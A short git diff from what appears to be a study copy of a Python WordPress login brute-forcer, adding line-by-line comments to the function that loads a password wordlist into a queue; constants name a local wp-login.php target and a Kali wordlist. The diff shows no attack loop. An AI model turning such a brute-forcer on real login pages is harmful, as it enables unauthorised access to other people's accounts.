@@ -12,15 +12,22 @@ SUCCESS = 'Welcome to WordPress!'                               # Our code later
 TARGET = "http://localhost:8080/wp-login.php"
 WORDLIST = "/home/kali/Downloads/cain-and-abel.txt" 
 
-def get_words():
-    with open(WORDLIST) as f:
-        raw_words = f.read()
-    
-    words = Queue()
 
-    for word in raw_words.split():
-        words.put(word)
-    return words
+# Loads words from the wordlist file into a queue.
+def get_words():
+    with open(WORDLIST) as f:                                   # Opens our wordlist.
+        raw_words = f.read()                                    # Reads the entire file into one string, 
+                                                                # so raw_words now contains all file contents.
+    
+    words = Queue()                                             # Creates a new thread-safe queue.
+
+    for word in raw_words.split():                              # Loops through each resulting token, 
+                                                                # splitting the file text into separate words using whitespace. 
+                                                                # `word` is each individual token in return. 
+        words.put(word)                                         # Adds each word into the queue. put() inserts an item into a Queue.
+    return words                                                # Returns the queue object, giving us a queue filled with words from the wordlist. 
+
+
 
 def get_params(content):
     params = dict()
